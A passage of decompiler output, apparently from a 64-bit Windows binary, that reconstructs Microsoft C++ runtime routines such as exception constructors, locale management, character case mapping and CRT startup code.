  const __m128i *v22; // r10
  __m128i v23; // xmm1
  __m128i v24; // xmm1
  unsigned int v25; // eax

  v4 = (char *)a2 - (char *)a1;
  if ( (((char *)a2 - (char *)a1) & 0xFFFFFFFFFFFFFFE0uLL) != 0 && (dword_14009E90C & 0x20) != 0 )
  {
    _EAX = a3;
    v6 = (const __m128i *)((char *)a1 + (((char *)a2 - (char *)a1) & 0xFFFFFFFFFFFFFFE0uLL));
    __asm
    {
      vmovd   xmm3, eax
      vpunpcklwd xmm3, xmm3, xmm3
      vpshufd xmm3, xmm3, 0
      vinsertf128 ymm3, ymm3, xmm3, 1
    }
    do
    {
      __asm
      {
        vpcmpeqw ymm1, ymm3, ymmword ptr [rcx]
        vpmovmskb eax, ymm1
      }
      if ( _EAX != 0 )
        goto LABEL_14;
      a1 += 2;
    }
    while ( a1 != v6 );
    v13 = v4 & 0x1C;
    if ( v13 == 0 )
    {
LABEL_9:
      __asm { vzeroupper }
      goto LABEL_10;
    }
    _RAX = (char *)&unk_14008EDA0 - v13;
    __asm
    {
      vmovdqu ymm2, ymmword ptr [rax]
      vpmaskmovd ymm0, ymm2, ymmword ptr [rcx]
      vpcmpeqw ymm1, ymm0, ymm3
      vpand   ymm2, ymm1, ymm2
      vpmovmskb eax, ymm2
    }
    if ( _EAX == 0 )
    {
      a1 = (const __m128i *)((char *)a1 + v13);
      goto LABEL_9;
    }
LABEL_14:
    __asm
    {
      vzeroupper
      tzcnt   eax, eax
    }
    return (const __m128i *)((char *)a1 + _EAX);
  }
  else
  {
    v21 = v4 & 0xFFFFFFFFFFFFFFF0uLL;
    if ( v21 != 0 && (dword_14009E90C & 4) != 0 )
    {
      v22 = (const __m128i *)((char *)a1 + v21);
      v23 = _mm_cvtsi32_si128(a3);
      v24 = _mm_shuffle_epi32(_mm_unpacklo_epi16(v23, v23), 0);
      while ( 1 )
      {
        v25 = _mm_movemask_epi8(_mm_cmpeq_epi16(_mm_loadu_si128(a1), v24));
        if ( v25 != 0 )
          break;
        if ( ++a1 == v22 )
          goto LABEL_10;
      }
      _BitScanForward(&v25, v25);
      return (const __m128i *)((char *)a1 + v25);
    }
    else
    {
LABEL_10:
      while ( a1 != a2 )
      {
        if ( a1->m128i_i16[0] == a3 )
          break;
        a1 = (const __m128i *)((char *)a1 + 2);
      }
      return a1;
    }
  }
}


// ----- sub_14000F610 @ 0x14000f610 -----
// attributes: thunk
const __m128i *__fastcall sub_14000F610(const __m128i *a1, const __m128i *a2, __int16 a3)
{
  return sub_14000F510(a1, a2, a3);
}


// ----- sub_14000F618 @ 0x14000f618 -----
_QWORD *__fastcall sub_14000F618(_QWORD *a1)
{
  a1[2] = 0;
  a1[1] = "bad allocation";
  *a1 = &std::bad_alloc::`vftable';
  return a1;
}


// ----- sub_14000F63C @ 0x14000f63c -----
__int64 __fastcall sub_14000F63C(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  sub_1400111C8(a2 + 8, a1 + 8);
  *(_QWORD *)a1 = &std::length_error::`vftable';
  return a1;
}


// ----- sub_14000F678 @ 0x14000f678 -----
__int64 __fastcall sub_14000F678(__int64 a1, __int64 a2)
{
  __int64 v4; // [rsp+20h] [rbp-18h] BYREF
  char v5; // [rsp+28h] [rbp-10h]

  v5 = 1;
  v4 = a2;
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  sub_1400111C8(&v4, a1 + 8);
  *(_QWORD *)a1 = &std::length_error::`vftable';
  return a1;
}


// ----- sub_14000F6C0 @ 0x14000f6c0 -----
__int64 __fastcall sub_14000F6C0(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  sub_1400111C8(a2 + 8, a1 + 8);
  *(_QWORD *)a1 = &std::logic_error::`vftable';
  return a1;
}


// ----- sub_14000F6FC @ 0x14000f6fc -----
__int64 __fastcall sub_14000F6FC(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  sub_1400111C8(a2 + 8, a1 + 8);
  *(_QWORD *)a1 = &std::out_of_range::`vftable';
  return a1;
}


// ----- sub_14000F738 @ 0x14000f738 -----
__int64 __fastcall sub_14000F738(__int64 a1, __int64 a2)
{
  __int64 v4; // [rsp+20h] [rbp-18h] BYREF
  char v5; // [rsp+28h] [rbp-10h]

  v5 = 1;
  v4 = a2;
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  sub_1400111C8(&v4, a1 + 8);
  *(_QWORD *)a1 = &std::out_of_range::`vftable';
  return a1;
}


// ----- sub_14000F780 @ 0x14000f780 -----
__int64 __fastcall sub_14000F780(__int64 a1, __int64 a2)
{
  __int64 v4; // [rsp+20h] [rbp-18h] BYREF
  char v5; // [rsp+28h] [rbp-10h]

  v5 = 1;
  v4 = a2;
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  sub_1400111C8(&v4, a1 + 8);
  *(_QWORD *)a1 = &std::runtime_error::`vftable';
  return a1;
}


// ----- unknown_libname_48 @ 0x14000f7c8 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_48(_QWORD *a1)
{
  *a1 = &std::exception::`vftable';
  return sub_140011250(a1 + 1);
}


// ----- unknown_libname_49 @ 0x14000f7dc -----
// Microsoft VisualC v14 64bit runtime
char *__fastcall unknown_libname_49(char *Block, char a2)
{
  *(_QWORD *)Block = &std::exception::`vftable';
  sub_140011250(Block + 8);
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(Block);
  return Block;
}


// ----- sub_14000F820 @ 0x14000f820 -----
void __noreturn sub_14000F820()
{
  _QWORD v0[5]; // [rsp+20h] [rbp-28h] BYREF

  sub_14000F618(v0);
  sub_140011278(v0, &_TI2_AVbad_alloc_std__);
  __debugbreak();
}


// ----- sub_14000F840 @ 0x14000f840 -----
void __fastcall __noreturn sub_14000F840(__int64 a1)
{
  _BYTE v1[40]; // [rsp+20h] [rbp-28h] BYREF

  sub_14000F678((__int64)v1, a1);
  sub_140011278(v1, &_TI3_AVlength_error_std__);
  JUMPOUT(0x14000F862LL);
}


// ----- sub_14000F864 @ 0x14000f864 -----
void __fastcall __noreturn sub_14000F864(__int64 a1)
{
  _BYTE v1[40]; // [rsp+20h] [rbp-28h] BYREF

  sub_14000F738((__int64)v1, a1);
  sub_140011278(v1, &_TI3_AVout_of_range_std__);
  JUMPOUT(0x14000F886LL);
}


// ----- sub_14000F888 @ 0x14000f888 -----
void __fastcall __noreturn sub_14000F888(__int64 a1)
{
  _BYTE v1[40]; // [rsp+20h] [rbp-28h] BYREF

  sub_14000F780((__int64)v1, a1);
  sub_140011278(v1, &_TI2_AVruntime_error_std__);
  JUMPOUT(0x14000F8AALL);
}


// ----- ?_Syserror_map@std@@YAPEBDH@Z @ 0x14000f8ac -----
const char *__fastcall std::_Syserror_map(int a1)
{
  const char *v1; // rax

  v1 = (const char *)&unk_14008F0D0;
  while ( *(_DWORD *)v1 != a1 )
  {
    v1 += 16;
    if ( v1 == "success" )
      return "unknown error";
  }
  return *((const char **)v1 + 1);
}


// ----- sub_14000F8D4 @ 0x14000f8d4 -----
void **__fastcall sub_14000F8D4(void **a1, _BYTE *a2)
{
  _BYTE *v4; // rcx
  _BYTE *i; // rax
  size_t v6; // rsi
  void *v7; // rax

  v4 = *a1;
  if ( v4 != a2 )
  {
    if ( v4 != nullptr )
      j__free_base(v4);
    *a1 = nullptr;
    if ( a2 != nullptr )
    {
      for ( i = a2; *i != 0; ++i )
        ;
      v6 = i - a2 + 1;
      v7 = j__malloc_base(v6);
      *a1 = v7;
      if ( v7 != nullptr )
        memcpy(v7, a2, v6);
    }
  }
  return a1;
}


// ----- ??_G_Locimp@locale@std@@MEAAPEAXI@Z @ 0x14000f950 -----
std::locale::_Locimp *__fastcall std::locale::_Locimp::`scalar deleting destructor'(
        std::locale::_Locimp *this,
        char a2)
{
  void *v4; // rcx

  *(_QWORD *)this = &std::locale::_Locimp::`vftable';
  std::locale::_Locimp::_Locimp_dtor(this);
  v4 = *((void **)this + 5);
  if ( v4 != nullptr )
    j__free_base(v4);
  *((_QWORD *)this + 5) = 0;
  *(_QWORD *)this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    j_j_j__free_base(this);
  return this;
}


// ----- sub_14000F9B0 @ 0x14000f9b0 -----
void *__fastcall sub_14000F9B0(__int64 a1)
{
  _QWORD *v2; // rdx
  void *result; // rax

  v2 = j__malloc_base(0x10u);
  if ( v2 == nullptr )
    sub_14000F820();
  result = qword_14009FDE8;
  *v2 = qword_14009FDE8;
  v2[1] = a1;
  qword_14009FDE8 = v2;
  return result;
}


// ----- sub_14000F9EC @ 0x14000f9ec -----
__int64 sub_14000F9EC()
{
  return qword_14009FDF8;
}


// ----- sub_14000F9F4 @ 0x14000f9f4 -----
struct std::locale::_Locimp *__fastcall sub_14000F9F4(char a1)
{
  struct std::locale::_Locimp *v2; // rbx
  char v4; // [rsp+30h] [rbp+8h] BYREF

  std::_Lockit::_Lockit((std::_Lockit *)&v4, 0);
  v2 = (struct std::locale::_Locimp *)qword_14009FDF8;
  if ( qword_14009FDF8 == 0 )
  {
    v2 = std::locale::_Locimp::_New_Locimp(false);
    std::locale::_Setgloballocale(v2);
    *((_DWORD *)v2 + 8) = 63;
    sub_14000F8D4((void **)v2 + 5, byte_14008FCAC);
    (*(void (__fastcall **)(struct std::locale::_Locimp *))(*(_QWORD *)v2 + 8LL))(v2);
    qword_14009FDD8 = (__int64)v2;
    qword_14009FDA8 = (__int64)v2;
  }
  if ( a1 != 0 )
    (*(void (__fastcall **)(struct std::locale::_Locimp *))(*(_QWORD *)v2 + 8LL))(v2);
  std::_Lockit::~_Lockit((std::_Lockit *)&v4);
  return v2;
}


// ----- ?_Locimp_dtor@_Locimp@locale@std@@CAXPEAV123@@Z @ 0x14000fa90 -----
static void __fastcall std::locale::_Locimp::_Locimp_dtor(struct std::locale::_Locimp *a1)
{
  __int64 v2; // rdi
  __int64 v3; // rcx
  void (__fastcall ***v4)(_QWORD, __int64); // rax
  char v5; // [rsp+30h] [rbp+8h] BYREF

  std::_Lockit::_Lockit((std::_Lockit *)&v5, 0);
  v2 = *((_QWORD *)a1 + 3);
  while ( v2 != 0 )
  {
    --v2;
    v3 = *(_QWORD *)(*((_QWORD *)a1 + 2) + 8 * v2);
    if ( v3 != 0 )
    {
      v4 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 16LL))(v3);
      if ( v4 != nullptr )
        (**v4)(v4, 1);
    }
  }
  j__free_base(*((void **)a1 + 2));
  std::_Lockit::~_Lockit((std::_Lockit *)&v5);
}


// ----- ?_Locinfo_ctor@_Locinfo@std@@SAXPEAV12@PEBD@Z @ 0x14000fb0c -----
static void __fastcall std::_Locinfo::_Locinfo_ctor(void **a1, char *a2)
{
  char *v4; // rax

  v4 = setlocale(0, nullptr);
  if ( v4 == nullptr )
    v4 = (char *)&unk_14008C378;
  sub_14000F8D4(a1 + 9, v4);
  if ( a2 != nullptr )
    a2 = setlocale(0, a2);
  if ( a2 == nullptr )
    a2 = (char *)&unk_14008FCA8;
  sub_14000F8D4(a1 + 11, a2);
}


// ----- ?_Locinfo_dtor@_Locinfo@std@@SAXPEAV12@@Z @ 0x14000fb78 -----
static void __fastcall std::_Locinfo::_Locinfo_dtor(struct std::_Locinfo *a1)
{
  const char *v1; // rdx

  v1 = *((const char **)a1 + 9);
  if ( v1 != nullptr )
    setlocale(0, v1);
}


// ----- ?_New_Locimp@_Locimp@locale@std@@CAPEAV123@_N@Z @ 0x14000fb94 -----
static void **__fastcall std::locale::_Locimp::_New_Locimp(char a1)
{
  void **v2; // rax
  void **v3; // rbx

  v2 = (void **)operator new(0x38u);
  v3 = v2;
  if ( v2 == nullptr )
    return nullptr;
  *((_DWORD *)v2 + 2) = 1;
  v2[2] = nullptr;
  v2[3] = nullptr;
  *((_DWORD *)v2 + 8) = 0;
  *v2 = &std::locale::_Locimp::`vftable';
  *((_BYTE *)v2 + 36) = a1;
  v2[5] = nullptr;
  *((_BYTE *)v2 + 48) = 0;
  sub_14000F8D4(v2 + 5, byte_14008FCA8);
  return v3;
}


// ----- ?_Setgloballocale@locale@std@@CAXPEAX@Z @ 0x14000fc04 -----
static void __fastcall std::locale::_Setgloballocale(__int64 a1)
{
  if ( byte_14009FE00 == 0 )
  {
    byte_14009FE00 = 1;
    _Atexit(sub_14000FC74);
  }
  qword_14009FDF8 = a1;
}


// ----- _Deletegloballocale @ 0x14000fc38 -----
void __fastcall Deletegloballocale(__int64 *a1)
{
  __int64 v1; // rcx
  void (__fastcall ***v2)(_QWORD, __int64); // rax

  v1 = *a1;
  if ( v1 != 0 )
  {
    v2 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 16LL))(v1);
    if ( v2 != nullptr )
      (**v2)(v2, 1);
  }
}


// ----- sub_14000FC74 @ 0x14000fc74 -----
void sub_14000FC74()
{
  char v0; // [rsp+30h] [rbp+8h] BYREF

  std::_Lockit::_Lockit((std::_Lockit *)&v0, 0);
  Deletegloballocale(&qword_14009FDF8);
  qword_14009FDF8 = 0;
  std::_Lockit::~_Lockit((std::_Lockit *)&v0);
}


// ----- sub_14000FCAC @ 0x14000fcac -----
__int64 __fastcall sub_14000FCAC(__int64 a1)
{
  _OWORD *v2; // rax
  _OWORD *v3; // rdi
  const unsigned __int16 *v4; // rax
  __int64 i; // rcx
  __int128 v6; // xmm1
  wchar_t *v7; // rcx

  *(_DWORD *)a1 = __lc_codepage_func();
  v2 = j__calloc_base(0x100u, 2u);
  *(_QWORD *)(a1 + 8) = v2;
  v3 = v2;
  if ( v2 != nullptr )
  {
    v4 = _pctype_func();
    for ( i = 4; i != 0; --i )
    {
      *v3 = *(_OWORD *)v4;
      v3[1] = *((_OWORD *)v4 + 1);
      v3[2] = *((_OWORD *)v4 + 2);
      v3[3] = *((_OWORD *)v4 + 3);
      v3[4] = *((_OWORD *)v4 + 4);
      v3[5] = *((_OWORD *)v4 + 5);
      v3[6] = *((_OWORD *)v4 + 6);
      v3 += 8;
      v6 = *((_OWORD *)v4 + 7);
      v4 += 64;
      *(v3 - 1) = v6;
    }
    *(_DWORD *)(a1 + 16) = 1;
  }
  else
  {
    *(_QWORD *)(a1 + 8) = _pctype_func();
    *(_DWORD *)(a1 + 16) = 0;
  }
  v7 = __lc_locale_name_func()[1];
  *(_QWORD *)(a1 + 24) = v7;
  if ( v7 != nullptr )
    *(_QWORD *)(a1 + 24) = sub_1400185D0();
  return a1;
}


// ----- sub_14000FD74 @ 0x14000fd74 -----
__int64 __fastcall sub_14000FD74(int a1, __int64 a2)
{
  __int64 v2; // rbx
  const WCHAR *v4; // rsi
  UINT CodePage; // ebp
  __int64 result; // rax
  unsigned __int8 v7; // ch
  int v8; // edx
  int v9; // edi
  int v10; // eax
  bool v11; // zf
  char String; // [rsp+68h] [rbp+10h] BYREF
  char v13; // [rsp+69h] [rbp+11h]
  char v14; // [rsp+6Ah] [rbp+12h]
  WCHAR DestStr; // [rsp+70h] [rbp+18h] BYREF

  v2 = a1;
  if ( a2 != 0 )
  {
    v4 = *(const WCHAR **)(a2 + 24);
    CodePage = *(_DWORD *)a2;
  }
  else
  {
    v4 = __lc_locale_name_func()[2];
    CodePage = __lc_codepage_func();
  }
  if ( v4 == nullptr )
  {
    result = (unsigned int)(v2 + 32);
    if ( (unsigned int)(v2 - 65) > 0x19 )
      return (unsigned int)v2;
    return result;
  }
  if ( (unsigned int)v2 < 0x100 )
  {
    if ( a2 == 0 )
    {
      if ( isupper(v2) != 0 )
        goto LABEL_17;
      return (unsigned int)v2;
    }
    v7 = BYTE1(v2);
    if ( (*(_BYTE *)(*(_QWORD *)(a2 + 8) + 2 * v2) & 1) == 0 )
      return (unsigned int)v2;
LABEL_13:
    v8 = *(unsigned __int16 *)(*(_QWORD *)(a2 + 8) + 2LL * v7) >> 15;
    v9 = (int)v2 >> 8;
    goto LABEL_14;
  }
  v7 = BYTE1(v2);
  if ( a2 != 0 )
    goto LABEL_13;
LABEL_17:
  v9 = (int)v2 >> 8;
  v8 = _pctype_func()[BYTE1(v2)] & 0x8000;
LABEL_14:
  if ( v8 != 0 )
  {
    String = v9;
    v13 = v2;
    v14 = 0;
  }
  else
  {
    String = v2;
    v13 = 0;
  }
  v10 = _crtLCMapStringA(v4, 0x100u, &String, &DestStr, 3, CodePage, 1);
  if ( v10 == 0 )
    return (unsigned int)v2;
  v11 = v10 == 1;
  result = (unsigned __int8)DestStr;
  if ( !v11 )
    return HIBYTE(DestStr) | ((unsigned __int8)DestStr << 8);
  return result;
}


// ----- sub_14000FEA4 @ 0x14000fea4 -----
__int64 __fastcall sub_14000FEA4(int a1, __int64 a2)
{
  __int64 v2; // rbx
  const WCHAR *v4; // rsi
  UINT CodePage; // r14d
  __int64 result; // rax
  unsigned __int8 v7; // ch
  int v8; // edx
  int v9; // edi
  int v10; // eax
  bool v11; // zf
  char String; // [rsp+68h] [rbp+10h] BYREF
  char v13; // [rsp+69h] [rbp+11h]
  char v14; // [rsp+6Ah] [rbp+12h]
  WCHAR DestStr; // [rsp+70h] [rbp+18h] BYREF

  v2 = a1;
  if ( a2 != 0 )
  {
    v4 = *(const WCHAR **)(a2 + 24);
    CodePage = *(_DWORD *)a2;
  }
  else
  {
    v4 = __lc_locale_name_func()[2];
    CodePage = __lc_codepage_func();
  }
  if ( v4 == nullptr )
  {
    result = (unsigned int)(v2 - 32);
    if ( (unsigned int)(v2 - 97) > 0x19 )
      return (unsigned int)v2;
    return result;
  }
  if ( (unsigned int)v2 < 0x100 )
  {
    if ( a2 == 0 )
    {
      if ( islower(v2) != 0 )
        goto LABEL_17;
      return (unsigned int)v2;
    }
    v7 = BYTE1(v2);
    if ( (*(_BYTE *)(*(_QWORD *)(a2 + 8) + 2 * v2) & 2) == 0 )
      return (unsigned int)v2;
LABEL_13:
    v8 = *(unsigned __int16 *)(*(_QWORD *)(a2 + 8) + 2LL * v7) >> 15;
    v9 = (int)v2 >> 8;
    goto LABEL_14;
  }
  v7 = BYTE1(v2);
  if ( a2 != 0 )
    goto LABEL_13;
LABEL_17:
  v9 = (int)v2 >> 8;
  v8 = _pctype_func()[BYTE1(v2)] & 0x8000;
LABEL_14:
  if ( v8 != 0 )
  {
    String = v9;
    v13 = v2;
    v14 = 0;
  }
  else
  {
    String = v2;
    v13 = 0;
  }
  v10 = _crtLCMapStringA(v4, 0x200u, &String, &DestStr, 3, CodePage, 1);
  if ( v10 == 0 )
    return (unsigned int)v2;
  v11 = v10 == 1;
  result = (unsigned __int8)DestStr;
  if ( !v11 )
    return HIBYTE(DestStr) | ((unsigned __int8)DestStr << 8);
  return result;
}


// ----- ?_Addstd@ios_base@std@@SAXPEAV12@@Z @ 0x14000ffe4 -----
static void __fastcall std::ios_base::_Addstd(struct std::ios_base *a1)
{
  unsigned __int64 i; // rax
  struct std::ios_base *v3; // rdx
  unsigned __int64 v4; // rcx
  char v5; // [rsp+30h] [rbp+8h] BYREF

  std::_Lockit::_Lockit((std::_Lockit *)&v5, 2);
  *((_QWORD *)a1 + 1) = 1;
  for ( i = 1; i < 8; v4 = i )
  {
    v3 = (struct std::ios_base *)qword_14009FE20[i];
    v4 = i;
    if ( v3 == nullptr )
      break;
    if ( v3 == a1 )
      break;
    *((_QWORD *)a1 + 1) = ++i;
  }
  ++byte_14009FE70[v4];
  qword_14009FE20[v4] = (__int64)a1;
  std::_Lockit::~_Lockit((std::_Lockit *)&v5);
}


// ----- sub_140010058 @ 0x140010058 -----
void __fastcall sub_140010058(std::ios_base *this)
{
  __int64 v1; // rax
  _QWORD *v3; // rbx
  __int64 v4; // rcx
  void (__fastcall ***v5)(_QWORD, __int64); // rax

  v1 = *((_QWORD *)this + 1);
  if ( v1 == 0 || (--byte_14009FE70[v1], (char)byte_14009FE70[v1] <= 0) )
  {
    std::ios_base::_Tidy(this);
    v3 = *((_QWORD **)this + 8);
    if ( v3 != nullptr )
    {
      v4 = v3[1];
      if ( v4 != 0 )
      {
        v5 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 16LL))(v4);
        if ( v5 != nullptr )
          (**v5)(v5, 1);
      }
      j_j_j__free_base(v3);
    }
  }
}


// ----- ?_Tidy@ios_base@std@@AEAAXXZ @ 0x1400100d0 -----
void __fastcall std::ios_base::_Tidy(std::ios_base *this)
{
  __int64 **i; // rbx
  _QWORD *v3; // rcx
  _QWORD *v4; // rbx
  _QWORD *v5; // rcx
  _QWORD *v6; // rbx

  for ( i = *((__int64 ***)this + 7); i != nullptr; i = (__int64 **)*i )
    ((void (__fastcall *)(_QWORD, std::ios_base *, _QWORD))i[2])(0, this, *((unsigned int *)i + 2));
  v3 = *((_QWORD **)this + 6);
  if ( v3 != nullptr )
  {
    do
    {
      v4 = (_QWORD *)*v3;
      j_j_j__free_base(v3);
      v3 = v4;
    }
    while ( v4 != nullptr );
  }
  *((_QWORD *)this + 6) = 0;
  v5 = *((_QWORD **)this + 7);
  if ( v5 != nullptr )
  {
    do
    {
      v6 = (_QWORD *)*v5;
      j_j_j__free_base(v5);
      v5 = v6;
    }
    while ( v6 != nullptr );
  }
  *((_QWORD *)this + 7) = 0;
}


// ----- sub_140010158 @ 0x140010158 -----
FILE *__fastcall sub_140010158(__int64 a1, int a2)
{
  __int64 v2; // rbx
  int v3; // r9d
  char v4; // si
  int v6; // ecx
  int v7; // edx
  unsigned int v8; // edx
  FILE *v9; // rax
  FILE *v10; // rdi

  v2 = 0;
  v3 = a2 | 1;
  v4 = a2;
  v6 = 0;
  if ( (a2 & 0x40) == 0 )
    v3 = a2;
  v7 = v3 | 2;
  if ( (v3 & 8) == 0 )
    v7 = v3;
  v8 = v7 & 0xFFFFFFBB;
  if ( dword_14009E830[0] == v8 )
  {
LABEL_8:
    v9 = (FILE *)common_fsopen<wchar_t>(a1, *(&off_14008FCC0 + v6));
    v10 = v9;
    if ( v9 != nullptr )
    {
      if ( (v4 & 4) != 0 && fseek(v9, 0, 2) != 0 )
        fclose(v10);
      else
        return v10;
    }
  }
  else
  {
    while ( ++v6 != 20 )
    {
      if ( dword_14009E830[v6] == v8 )
        goto LABEL_8;
    }
  }
  return (FILE *)v2;
}


// ----- DeleteCriticalSection @ 0x140010208 -----
// attributes: thunk
void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
{
  __imp_DeleteCriticalSection(lpCriticalSection);
}


// ----- _Mtxinit @ 0x140010210 -----
BOOL __fastcall Mtxinit(struct _RTL_CRITICAL_SECTION *a1)
{
  return InitializeCriticalSectionEx(a1, 0xFA0u, 0);
}


// ----- EnterCriticalSection @ 0x140010220 -----
// attributes: thunk
void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
{
  __imp_EnterCriticalSection(lpCriticalSection);
}


// ----- LeaveCriticalSection @ 0x140010228 -----
// attributes: thunk
void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)
{
  __imp_LeaveCriticalSection(lpCriticalSection);
}


// ----- sub_140010230 @ 0x140010230 -----
void *sub_140010230()
{
  return &unk_14009FE80;
}


// ----- ?_Atexit@@YAXP6AXXZ@Z @ 0x140010238 -----
void __fastcall _Atexit(void (*a1)())
{
  PVOID v1; // rax

  if ( qword_14009E880 == 0 )
    abort();
  v1 = EncodePointer(a1);
  qword_14009FEF0[--qword_14009E880] = v1;
}


// ----- __crtLCMapStringA @ 0x140010274 -----
__int64 __fastcall _crtLCMapStringA(
        LPCWSTR lpLocaleName,
        DWORD dwMapFlags,
        char *String,
        int a4,
        LPWSTR lpDestStr,
        int cchDest,
        UINT CodePage,
        int a8)
{
  int v8; // edi
  int v12; // eax
  bool v13; // cc
  int v14; // eax
  int v15; // r14d
  size_t v16; // rcx
  __int64 v17; // rax
  void *v18; // rsp
  WCHAR *v19; // rbx
  WCHAR *v20; // rax
  int v22; // eax
  unsigned int v23; // esi
  unsigned __int64 v24; // rcx
  unsigned __int64 v25; // rdx
  __int64 v26; // rax
  void *v27; // rsp
  WCHAR *v28; // rdi
  WCHAR *v29; // rax
  WCHAR *v30; // rcx
  bool v31; // zf
  _BYTE v32[32]; // [rsp+0h] [rbp-50h] BYREF
  LPWSTR lpWideCharStr; // [rsp+20h] [rbp-30h]
  int cchWideChar; // [rsp+28h] [rbp-28h]
  LPNLSVERSIONINFO lpVersionInformation; // [rsp+30h] [rbp-20h]
  LPVOID lpReserved; // [rsp+38h] [rbp-18h]
  _DWORD v37[8]; // [rsp+50h] [rbp+0h] BYREF

  v8 = a4;
  if ( a4 > 0 )
  {
    v12 = _strncnt(String, a4);
    v13 = v12 < v8;
    v8 = v12 + 1;
    if ( !v13 )
      v8 = v12;
  }
  v14 = MultiByteToWideChar(CodePage, a8 != 0 ? 9 : 1, String, v8, nullptr, 0);
  v15 = v14;
  if ( v14 == 0 )
    return 0;
  v16 = (2LL * v14 + 16) & -(__int64)(2LL * v14 < (unsigned __int64)(2LL * v14 + 16));
  if ( v16 == 0 )
    return 0;
  if ( v16 > 0x400 )
  {
    v20 = (WCHAR *)j__malloc_base(v16);
    v19 = v20;
    if ( v20 == nullptr )
      goto LABEL_14;
    *(_DWORD *)v20 = 56797;
  }
  else
  {
    v17 = v16 + 15;
    if ( v16 + 15 < v16 )
      v17 = 0xFFFFFFFFFFFFFF0LL;
    v18 = alloca(v17 & 0xFFFFFFFFFFFFFFF0uLL);
    v19 = (WCHAR *)v37;
    if ( v32 == (_BYTE *)-80LL )
      return 0;
    v37[0] = 52428;
  }
  v19 += 8;
LABEL_14:
  if ( v19 == nullptr )
    return 0;
  if ( MultiByteToWideChar(CodePage, 1u, String, v8, v19, v15) == 0
    || (v22 = LCMapStringEx(lpLocaleName, dwMapFlags, v19, v15, nullptr, 0, nullptr, nullptr, 0), v23 = v22, v22 == 0) )
  {
    if ( *((_DWORD *)v19 - 4) == 56797 )
      j__free_base(v19 - 8);
    return 0;
  }
  if ( (dwMapFlags & 0x400) != 0 )
  {
    if ( cchDest != 0 && v22 <= cchDest )
      LCMapStringEx(lpLocaleName, dwMapFlags, v19, v15, lpDestStr, cchDest, nullptr, nullptr, 0);
    goto LABEL_43;
  }
  v24 = 2LL * v22 + 16;
  v25 = v24 & -(__int64)(2LL * v22 < v24);
  if ( v25 != 0 )
  {
    if ( v25 > 0x400 )
    {
      v29 = (WCHAR *)j__malloc_base(v24 & -(__int64)(2LL * v22 < v24));
      v28 = v29;
      if ( v29 == nullptr )
        goto LABEL_33;
      *(_DWORD *)v29 = 56797;
    }
    else
    {
      v26 = v25 + 15;
      if ( v25 + 15 < v25 )
        v26 = 0xFFFFFFFFFFFFFF0LL;
      v27 = alloca(v26 & 0xFFFFFFFFFFFFFFF0uLL);
      v28 = (WCHAR *)v37;
      if ( v32 == (_BYTE *)-80LL )
        goto LABEL_43;
      v37[0] = 52428;
    }
    v28 += 8;
LABEL_33:
    if ( v28 != nullptr )
    {
      if ( LCMapStringEx(lpLocaleName, dwMapFlags, v19, v15, v28, v23, nullptr, nullptr, 0) == 0 )
      {
        if ( *((_DWORD *)v28 - 4) == 56797 )
          j__free_base(v28 - 8);
        v30 = v19 - 8;
        v31 = *((_DWORD *)v19 - 4) == 56797;
        goto LABEL_44;
      }
      lpReserved = nullptr;
      lpVersionInformation = nullptr;
      if ( cchDest != 0 )
      {
        cchWideChar = cchDest;
        lpWideCharStr = lpDestStr;
      }
      else
      {
        cchWideChar = 0;
        lpWideCharStr = nullptr;
      }
      v23 = WideCharToMultiByte(
              CodePage,
              0,
              v28,
              v23,
              (LPSTR)lpWideCharStr,
              cchWideChar,
              (LPCCH)lpVersionInformation,
              (LPBOOL)lpReserved);
      if ( *((_DWORD *)v28 - 4) == 56797 )
        j__free_base(v28 - 8);
    }
  }
LABEL_43:
  v30 = v19 - 8;
  v31 = *((_DWORD *)v19 - 4) == 56797;
LABEL_44:
  if ( v31 )
    j__free_base(v30);
  return v23;
}


// ----- ?pre_c_initialization@@YAHXZ @ 0x140010580 -----
__int64 __fastcall pre_c_initialization()
{
  int startup_file_mode; // eax
  int v1; // ebx
  charNode *v2; // rcx
  unsigned int v3; // eax
  unsigned int v4; // eax
  __int64 result; // rax

  sub_140018DC8(1);
  startup_file_mode = get_startup_file_mode();
  set_fmode(startup_file_mode);
  v1 = sub_140010FA0();
  *(_DWORD *)sub_14001B39C() = v1;
  if ( (unsigned __int8)_scrt_initialize_onexit_tables(1) != 0 )
  {
    sub_1400110E4();
    atexit(sub_140011120);
    v3 = charNode::raw_length(v2);
    if ( (unsigned int)sub_140019024(v3) == 0 )
    {
      sub_140010FB4();
      if ( (unsigned int)_scrt_is_user_matherr_present() != 0 )
        sub_140018DE0(sub_140010FA0);
      v4 = sub_140010FA0();
      sub_140019FF4(v4);
      if ( (unsigned __int8)sub_140010FC4() != 0 )
        common_initialize_environment_nolock<char>();
      sub_140010FA0();
      result = sub_14001101C();
      if ( (_DWORD)result == 0 )
        return result;
    }
  }
  RtlFailFast(7);
}


// ----- ?post_pgo_initialization@@YAHXZ @ 0x140010638 -----
__int64 __fastcall post_pgo_initialization()
{
  _scrt_initialize_default_local_stdio_options();
  return 0;
}


// ----- ?pre_cpp_initialization@@YAXXZ @ 0x140010648 -----
void __fastcall pre_cpp_initialization()
{
  int v0; // eax

  _scrt_set_unhandled_exception_filter();
